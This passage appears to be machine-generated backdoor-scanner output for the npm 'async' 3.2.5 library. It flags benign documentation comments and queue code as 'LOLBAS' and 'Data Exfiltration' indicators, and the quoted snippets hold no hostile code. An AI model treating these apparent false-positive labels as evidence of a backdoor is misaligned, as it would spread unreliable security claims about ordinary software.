                      "text": " * @category Control Flow\n * @param {AsyncFunction} test - asynchronous truth test to perform before each\n * execution of `iteratee`. Invoked with (callback).\n * @param {AsyncFunction} iteratee - An async function which is called each time\n * `test` passes. Invoked with (callback).\n * @param {Function} [callback] - A callback which is called after the test\n * function has failed and repeated execution of `iteratee` has stopped. `callback`\n * will be passed an error and any arguments passed to the final `iteratee`'s\n",
                      "markdown": "` * @category Control Flow\n * @param {AsyncFunction} test - asynchronous truth test to perform before each\n * execution of `iteratee`. Invoked with (callback).\n * @param {AsyncFunction} iteratee - An async function which is called each time\n * `test` passes. Invoked with (callback).\n * @param {Function} [callback] - A callback which is called after the test\n * function has failed and repeated execution of `iteratee` has stopped. `callback`\n * will be passed an error and any arguments passed to the final `iteratee`'s\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5246,
                  "startColumn": 5,
                  "endLine": 5246,
                  "endColumn": 14,
                  "snippet": {
                    "text": " * @param {AsyncFunction} asyncFn - The async function to limit in time.\n * @param {number} milliseconds - The specified time limit.\n * @param {*} [info] - Any variable you want attached (`string`, `object`, etc)\n * to timeout Error for more information..\n * @returns {AsyncFunction} Returns a wrapped function that can be used with any\n * of the control flow functions.\n * Invoke this function with the same parameters as you would `asyncFunc`.\n",
                    "rendered": {
                      "text": " * @param {AsyncFunction} asyncFn - The async function to limit in time.\n * @param {number} milliseconds - The specified time limit.\n * @param {*} [info] - Any variable you want attached (`string`, `object`, etc)\n * to timeout Error for more information..\n * @returns {AsyncFunction} Returns a wrapped function that can be used with any\n * of the control flow functions.\n * Invoke this function with the same parameters as you would `asyncFunc`.\n",
                      "markdown": "` * @param {AsyncFunction} asyncFn - The async function to limit in time.\n * @param {number} milliseconds - The specified time limit.\n * @param {*} [info] - Any variable you want attached (`string`, `object`, etc)\n * to timeout Error for more information..\n * @returns {AsyncFunction} Returns a wrapped function that can be used with any\n * of the control flow functions.\n * Invoke this function with the same parameters as you would `asyncFunc`.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5244,
                  "startColumn": 47,
                  "endLine": 5244,
                  "endColumn": 53,
                  "snippet": {
                    "text": " * @method\n * @category Util\n * @param {AsyncFunction} asyncFn - The async function to limit in time.\n * @param {number} milliseconds - The specified time limit.\n * @param {*} [info] - Any variable you want attached (`string`, `object`, etc)\n * to timeout Error for more information..\n * @returns {AsyncFunction} Returns a wrapped function that can be used with any\n",
                    "rendered": {
                      "text": " * @method\n * @category Util\n * @param {AsyncFunction} asyncFn - The async function to limit in time.\n * @param {number} milliseconds - The specified time limit.\n * @param {*} [info] - Any variable you want attached (`string`, `object`, etc)\n * to timeout Error for more information..\n * @returns {AsyncFunction} Returns a wrapped function that can be used with any\n",
                      "markdown": "` * @method\n * @category Util\n * @param {AsyncFunction} asyncFn - The async function to limit in time.\n * @param {number} milliseconds - The specified time limit.\n * @param {*} [info] - Any variable you want attached (`string`, `object`, etc)\n * to timeout Error for more information..\n * @returns {AsyncFunction} Returns a wrapped function that can be used with any\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5238,
                  "startColumn": 8,
                  "endLine": 5239,
                  "snippet": {
                    "text": " * its callback within the specified milliseconds, it will be called with a\n * timeout error. The code property for the error object will be `'ETIMEDOUT'`.\n *\n * @name timeout\n * @static\n * @memberOf module:Utils\n * @method\n * @category Util\n",
                    "rendered": {
                      "text": " * its callback within the specified milliseconds, it will be called with a\n * timeout error. The code property for the error object will be `'ETIMEDOUT'`.\n *\n * @name timeout\n * @static\n * @memberOf module:Utils\n * @method\n * @category Util\n",
                      "markdown": "` * its callback within the specified milliseconds, it will be called with a\n * timeout error. The code property for the error object will be `'ETIMEDOUT'`.\n *\n * @name timeout\n * @static\n * @memberOf module:Utils\n * @method\n * @category Util\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5236,
                  "startColumn": 2,
                  "endLine": 5236,
                  "endColumn": 11,
                  "snippet": {
                    "text": "/**\n * Sets a time limit on an asynchronous function. If the function does not call\n * its callback within the specified milliseconds, it will be called with a\n * timeout error. The code property for the error object will be `'ETIMEDOUT'`.\n *\n * @name timeout\n * @static\n",
                    "rendered": {
                      "text": "/**\n * Sets a time limit on an asynchronous function. If the function does not call\n * its callback within the specified milliseconds, it will be called with a\n * timeout error. The code property for the error object will be `'ETIMEDOUT'`.\n *\n * @name timeout\n * @static\n",
                      "markdown": "`/**\n * Sets a time limit on an asynchronous function. If the function does not call\n * its callback within the specified milliseconds, it will be called with a\n * timeout error. The code property for the error object will be `'ETIMEDOUT'`.\n *\n * @name timeout\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5234,
                  "startColumn": 9,
                  "endLine": 5234,
                  "endColumn": 15,
                  "snippet": {
                    "text": "var sortBy$1 = awaitify(sortBy, 3);\n\n/**\n * Sets a time limit on an asynchronous function. If the function does not call\n * its callback within the specified milliseconds, it will be called with a\n * timeout error. The code property for the error object will be `'ETIMEDOUT'`.\n *\n",
                    "rendered": {
                      "text": "var sortBy$1 = awaitify(sortBy, 3);\n\n/**\n * Sets a time limit on an asynchronous function. If the function does not call\n * its callback within the specified milliseconds, it will be called with a\n * timeout error. The code property for the error object will be `'ETIMEDOUT'`.\n *\n",
                      "markdown": "`var sortBy$1 = awaitify(sortBy, 3);\n\n/**\n * Sets a time limit on an asynchronous function. If the function does not call\n * its callback within the specified milliseconds, it will be called with a\n * timeout error. The code property for the error object will be `'ETIMEDOUT'`.\n *\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5076,
                  "startColumn": 58,
                  "endLine": 5076,
                  "endColumn": 64,
                  "snippet": {
                    "text": " * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {AsyncFunction} iteratee - An async function to apply to each item in\n * `coll`.\n * The iteratee should complete with a value to use as the sort criteria as\n * its `result`.\n * Invoked with (item, callback).\n * @param {Function} callback - A callback which is called after all the\n",
                    "rendered": {
                      "text": " * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {AsyncFunction} iteratee - An async function to apply to each item in\n * `coll`.\n * The iteratee should complete with a value to use as the sort criteria as\n * its `result`.\n * Invoked with (item, callback).\n * @param {Function} callback - A callback which is called after all the\n",
                      "markdown": "` * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {AsyncFunction} iteratee - An async function to apply to each item in\n * `coll`.\n * The iteratee should complete with a value to use as the sort criteria as\n * its `result`.\n * Invoked with (item, callback).\n * @param {Function} callback - A callback which is called after all the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4559,
                  "startColumn": 21,
                  "endLine": 4559,
                  "endColumn": 27,
                  "snippet": {
                    "text": " * object with `times` and `interval` or a number.\n * * `times` - The number of attempts to make before giving up.  The default\n *   is `5`.\n * * `interval` - The time to wait between retries, in milliseconds.  The\n *   default is `0`. The interval may also be specified as a function of the\n *   retry count (see example).\n * * `errorFilter` - An optional synchronous function that is invoked on\n",
                    "rendered": {
                      "text": " * object with `times` and `interval` or a number.\n * * `times` - The number of attempts to make before giving up.  The default\n *   is `5`.\n * * `interval` - The time to wait between retries, in milliseconds.  The\n *   default is `0`. The interval may also be specified as a function of the\n *   retry count (see example).\n * * `errorFilter` - An optional synchronous function that is invoked on\n",
                      "markdown": "` * object with `times` and `interval` or a number.\n * * `times` - The number of attempts to make before giving up.  The default\n *   is `5`.\n * * `interval` - The time to wait between retries, in milliseconds.  The\n *   default is `0`. The interval may also be specified as a function of the\n *   retry count (see example).\n * * `errorFilter` - An optional synchronous function that is invoked on\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4017,
                  "startColumn": 38,
                  "endLine": 4017,
                  "endColumn": 44,
                  "snippet": {
                    "text": "}\n\n// Binary min-heap implementation used for priority queue.\n// Implementation is stable, i.e. push time is considered for equal priorities\nclass Heap {\n    constructor() {\n        this.heap = [];\n",
                    "rendered": {
                      "text": "}\n\n// Binary min-heap implementation used for priority queue.\n// Implementation is stable, i.e. push time is considered for equal priorities\nclass Heap {\n    constructor() {\n        this.heap = [];\n",
                      "markdown": "`}\n\n// Binary min-heap implementation used for priority queue.\n// Implementation is stable, i.e. push time is considered for equal priorities\nclass Heap {\n    constructor() {\n        this.heap = [];\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3345,
                  "startColumn": 12,
                  "endLine": 3345,
                  "endColumn": 18,
                  "snippet": {
                    "text": " *     }, 1000);\n * };\n *\n * // in the node repl\n * node> async.log(hello, 'world');\n * 'hello world'\n */\n",
                    "rendered": {
                      "text": " *     }, 1000);\n * };\n *\n * // in the node repl\n * node> async.log(hello, 'world');\n * 'hello world'\n */\n",
                      "markdown": "` *     }, 1000);\n * };\n *\n * // in the node repl\n * node> async.log(hello, 'world');\n * 'hello world'\n */\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2564,
                  "startColumn": 75,
                  "endLine": 2565,
                  "snippet": {
                    "text": " * @method\n * @see [async.doWhilst]{@link module:ControlFlow.doWhilst}\n * @category Control Flow\n * @param {AsyncFunction} iteratee - An async function which is called each time\n * `test` fails. Invoked with (callback).\n * @param {AsyncFunction} test - asynchronous truth test to perform after each\n * execution of `iteratee`. Invoked with (...args, callback), where `...args` are the\n * non-error args from the previous callback of `iteratee`\n",
                    "rendered": {
                      "text": " * @method\n * @see [async.doWhilst]{@link module:ControlFlow.doWhilst}\n * @category Control Flow\n * @param {AsyncFunction} iteratee - An async function which is called each time\n * `test` fails. Invoked with (callback).\n * @param {AsyncFunction} test - asynchronous truth test to perform after each\n * execution of `iteratee`. Invoked with (...args, callback), where `...args` are the\n * non-error args from the previous callback of `iteratee`\n",
                      "markdown": "` * @method\n * @see [async.doWhilst]{@link module:ControlFlow.doWhilst}\n * @category Control Flow\n * @param {AsyncFunction} iteratee - An async function which is called each time\n * `test` fails. Invoked with (callback).\n * @param {AsyncFunction} test - asynchronous truth test to perform after each\n * execution of `iteratee`. Invoked with (...args, callback), where `...args` are the\n * non-error args from the previous callback of `iteratee`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2518,
                  "startColumn": 68,
                  "endLine": 2518,
                  "endColumn": 74,
                  "snippet": {
                    "text": " * @method\n * @see [async.whilst]{@link module:ControlFlow.whilst}\n * @category Control Flow\n * @param {AsyncFunction} iteratee - A function which is called each time `test`\n * passes. Invoked with (callback).\n * @param {AsyncFunction} test - asynchronous truth test to perform after each\n * execution of `iteratee`. Invoked with (...args, callback), where `...args` are the\n",
                    "rendered": {
                      "text": " * @method\n * @see [async.whilst]{@link module:ControlFlow.whilst}\n * @category Control Flow\n * @param {AsyncFunction} iteratee - A function which is called each time `test`\n * passes. Invoked with (callback).\n * @param {AsyncFunction} test - asynchronous truth test to perform after each\n * execution of `iteratee`. Invoked with (...args, callback), where `...args` are the\n",
                      "markdown": "` * @method\n * @see [async.whilst]{@link module:ControlFlow.whilst}\n * @category Control Flow\n * @param {AsyncFunction} iteratee - A function which is called each time `test`\n * passes. Invoked with (callback).\n * @param {AsyncFunction} test - asynchronous truth test to perform after each\n * execution of `iteratee`. Invoked with (...args, callback), where `...args` are the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2500,
                  "startColumn": 12,
                  "endLine": 2500,
                  "endColumn": 18,
                  "snippet": {
                    "text": " *     }, 1000);\n * };\n *\n * // in the node repl\n * node> async.dir(hello, 'world');\n * {hello: 'world'}\n */\n",
                    "rendered": {
                      "text": " *     }, 1000);\n * };\n *\n * // in the node repl\n * node> async.dir(hello, 'world');\n * {hello: 'world'}\n */\n",
                      "markdown": "` *     }, 1000);\n * };\n *\n * // in the node repl\n * node> async.dir(hello, 'world');\n * {hello: 'world'}\n */\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2341,
                  "startColumn": 9,
                  "endLine": 2342,
                  "snippet": {
                    "text": " * @static\n * @memberOf module:Collections\n * @method\n * @alias find\n * @category Collections\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {AsyncFunction} iteratee - A truth test to apply to each item in `coll`.\n * The iteratee must complete with a boolean value as its result.\n",
                    "rendered": {
                      "text": " * @static\n * @memberOf module:Collections\n * @method\n * @alias find\n * @category Collections\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {AsyncFunction} iteratee - A truth test to apply to each item in `coll`.\n * The iteratee must complete with a boolean value as its result.\n",
                      "markdown": "` * @static\n * @memberOf module:Collections\n * @method\n * @alias find\n * @category Collections\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {AsyncFunction} iteratee - A truth test to apply to each item in `coll`.\n * The iteratee must complete with a boolean value as its result.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 1658,
                  "startColumn": 23,
                  "endLine": 1658,
                  "endColumn": 29,
                  "snippet": {
                    "text": "                var l = q._tasks.length;\n                if (q.payload) l = Math.min(l, q.payload);\n                for (var i = 0; i < l; i++) {\n                    var node = q._tasks.shift();\n                    tasks.push(node);\n                    workersList.push(node);\n                    data.push(node.data);\n",
                    "rendered": {
                      "text": "                var l = q._tasks.length;\n                if (q.payload) l = Math.min(l, q.payload);\n                for (var i = 0; i < l; i++) {\n                    var node = q._tasks.shift();\n                    tasks.push(node);\n                    workersList.push(node);\n                    data.push(node.data);\n",
                      "markdown": "`                var l = q._tasks.length;\n                if (q.payload) l = Math.min(l, q.payload);\n                for (var i = 0; i < l; i++) {\n                    var node = q._tasks.shift();\n                    tasks.push(node);\n                    workersList.push(node);\n                    data.push(node.data);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 1363,
                  "startColumn": 56,
                  "endLine": 1363,
                  "endColumn": 62,
                  "snippet": {
                    "text": "}\n\n// Simple doubly linked list (https://en.wikipedia.org/wiki/Doubly_linked_list) implementation\n// used for queues. This implementation assumes that the node provided by the user can be modified\n// to adjust the next and last properties. We implement only the minimal functionality\n// for queue support.\nclass DLL {\n",
                    "rendered": {
                      "text": "}\n\n// Simple doubly linked list (https://en.wikipedia.org/wiki/Doubly_linked_list) implementation\n// used for queues. This implementation assumes that the node provided by the user can be modified\n// to adjust the next and last properties. We implement only the minimal functionality\n// for queue support.\nclass DLL {\n",
                      "markdown": "`}\n\n// Simple doubly linked list (https://en.wikipedia.org/wiki/Doubly_linked_list) implementation\n// used for queues. This implementation assumes that the node provided by the user can be modified\n// to adjust the next and last properties. We implement only the minimal functionality\n// for queue support.\nclass DLL {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 1281,
                  "startColumn": 37,
                  "endLine": 1281,
                  "endColumn": 43,
                  "snippet": {
                    "text": " *     },\n *     make_folder: function(callback) {\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: function(get_data, make_folder, callback) {\n",
                    "rendered": {
                      "text": " *     },\n *     make_folder: function(callback) {\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: function(get_data, make_folder, callback) {\n",
                      "markdown": "` *     },\n *     make_folder: function(callback) {\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: function(get_data, make_folder, callback) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 993,
                  "startColumn": 45,
                  "endLine": 993,
                  "endColumn": 51,
                  "snippet": {
                    "text": " *             },\n *             make_folder: function(callback) {\n *                 // async code to create a directory to store a file in\n *                 // this is run at the same time as getting the data\n *                 callback(null, 'folder');\n *             },\n *             write_file: ['get_data', 'make_folder', function(results, callback) {\n",
                    "rendered": {
                      "text": " *             },\n *             make_folder: function(callback) {\n *                 // async code to create a directory to store a file in\n *                 // this is run at the same time as getting the data\n *                 callback(null, 'folder');\n *             },\n *             write_file: ['get_data', 'make_folder', function(results, callback) {\n",
                      "markdown": "` *             },\n *             make_folder: function(callback) {\n *                 // async code to create a directory to store a file in\n *                 // this is run at the same time as getting the data\n *                 callback(null, 'folder');\n *             },\n *             write_file: ['get_data', 'make_folder', function(results, callback) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 959,
                  "startColumn": 37,
                  "endLine": 959,
                  "endColumn": 43,
                  "snippet": {
                    "text": " *     make_folder: function(callback) {\n *         console.log('in make_folder');\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: ['get_data', 'make_folder', function(results, callback) {\n",
                    "rendered": {
                      "text": " *     make_folder: function(callback) {\n *         console.log('in make_folder');\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: ['get_data', 'make_folder', function(results, callback) {\n",
                      "markdown": "` *     make_folder: function(callback) {\n *         console.log('in make_folder');\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: ['get_data', 'make_folder', function(results, callback) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 924,
                  "startColumn": 37,
                  "endLine": 924,
                  "endColumn": 43,
                  "snippet": {
                    "text": " *     },\n *     make_folder: function(callback) {\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: ['get_data', 'make_folder', function(results, callback) {\n",
                    "rendered": {
                      "text": " *     },\n *     make_folder: function(callback) {\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: ['get_data', 'make_folder', function(results, callback) {\n",
                      "markdown": "` *     },\n *     make_folder: function(callback) {\n *         // async code to create a directory to store a file in\n *         // this is run at the same time as getting the data\n *         callback(null, 'folder');\n *     },\n *     write_file: ['get_data', 'make_folder', function(results, callback) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 1984,
                  "startColumn": 6,
                  "endLine": 1984,
                  "endColumn": 11,
                  "snippet": {
                    "text": " * // Part of an app, that fetches cats of the logged user.\n * // This example uses `seq` function to avoid overnesting and error\n * // handling clutter.\n * app.get('/cats', function(request, response) {\n *     var User = request.models.User;\n *     async.seq(\n *         User.get.bind(User),  // 'User.get' has signature (id, callback(err, data))\n",
                    "rendered": {
                      "text": " * // Part of an app, that fetches cats of the logged user.\n * // This example uses `seq` function to avoid overnesting and error\n * // handling clutter.\n * app.get('/cats', function(request, response) {\n *     var User = request.models.User;\n *     async.seq(\n *         User.get.bind(User),  // 'User.get' has signature (id, callback(err, data))\n",
                      "markdown": "` * // Part of an app, that fetches cats of the logged user.\n * // This example uses `seq` function to avoid overnesting and error\n * // handling clutter.\n * app.get('/cats', function(request, response) {\n *     var User = request.models.User;\n *     async.seq(\n *         User.get.bind(User),  // 'User.get' has signature (id, callback(err, data))\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5829,
                  "startColumn": 8,
                  "endLine": 5829,
                  "endColumn": 36,
